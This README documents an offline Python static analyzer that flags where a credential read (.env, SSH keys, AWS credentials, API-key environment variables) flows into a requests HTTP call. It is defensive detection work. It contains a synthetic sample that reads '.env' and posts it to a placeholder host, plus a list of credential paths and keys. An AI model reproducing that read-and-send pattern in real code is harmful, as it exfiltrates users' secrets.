# Follow a credential read into a network call

This offline component inspects explicitly selected Python source. It can show
where a supported credential read becomes an argument to a supported HTTP call.
It never runs the program, reads the file named by it or contacts the URL.

From a Python 3.12 source checkout:

```sh
python3 scripts/credential-flow.py < /path/to/program.py
```

`STATIC_FLOW` reports the signal ID, credential-read positions and HTTP-call
position. `NO_SUPPORTED_FLOW` means no such flow was found within this profile.
`UNAVAILABLE` means the source could not be analyzed; it exits 2. A completed
observation exits 0. No output is a package, program or AI-answer safety clearance.

For example, this synthetic source produces a flow:

```python
import requests
from pathlib import Path
secret = Path(".env").read_text()
requests.post("https://example.invalid", data=secret)
```

Replacing `data=secret` with `data="hello"`, or replacing `secret` with a constant
before the call, produces no flow. Merely mentioning a credential path and a URL
is not enough. The file name does not prove the contents are live credentials;
the call does not prove a program ran or that a transfer was unauthorized.

## Supported profile

Method `python-credential-flow-observation/1.0.0` uses the built-in Python syntax
tree. It is a separate reference component for F-012, not the proposed Semgrep
implementation or an active PS signal. No new dependency is installed.

Supported code is straight-line module-level imports, simple name assignments,
expression statements and `pass`. Supported imports are `requests`, `os` and
`from pathlib import Path`, including import aliases. Assignments copy values and
replace previous bindings. List/tuple/dict construction and `+` concatenation
propagate known read positions. Calls to unknown functions, loops, conditions,
functions/classes, comprehensions, unpacking and unsupported transformations are
unavailable. Unsupported syntax never silently produces a negative result.

Recognized file paths end in `.env`, `.ssh/id_rsa`, `.ssh/id_ed25519`, or
`.aws/credentials`. These are literal ASCII paths without `..` or backslashes.
Argument-free `open(path).read()`, `Path(path).read_text()` and `.read_bytes()`
are supported; `open` may use explicit `r` or `rb`. Opening a file without a read
does not constitute a secret-read flow. No named file is opened by the analyzer.

Environment reads are literal keys in imported `os.environ`: `OPENAI_API_KEY`,
`AWS_SECRET_ACCESS_KEY`, `GITHUB_TOKEN`, `DATABASE_PASSWORD`. Actual environment
contents are never consulted. Other keys do not become credential evidence.

Sinks are the imported requests module's `post`, `put`, `patch`, `get`, with one
literal HTTP(S) URL. URL credentials and whitespace are refused. Supported keyword
arguments are `data`, `json`, `files`, `params`, `headers`, `timeout`. A known
credential value flowing into payload/query/header arguments is reported.
`timeout` is a local setting, never a network payload. No HTTP call occurs.
Shadowed imports/builtins and unknown calls are unavailable.

Limits: 8,000 characters, 2,000 syntax nodes, expression depth 32. Output uses
frozen NFC-normalized Unicode codepoints; AST UTF-8 byte columns are converted.
The source hash and subject hash make the observation reproducible. Subject hashes
and positions can correlate private code: review before sharing the JSON.

This component does not classify whether a displayed program is recommended,
quoted, authorized or malicious. Those boundaries and independent measurement
must be satisfied before a PS enhancement can ship. F-012 stays open.
Controls: `python3 -m pytest tests/test_credential_flow.py -q`.
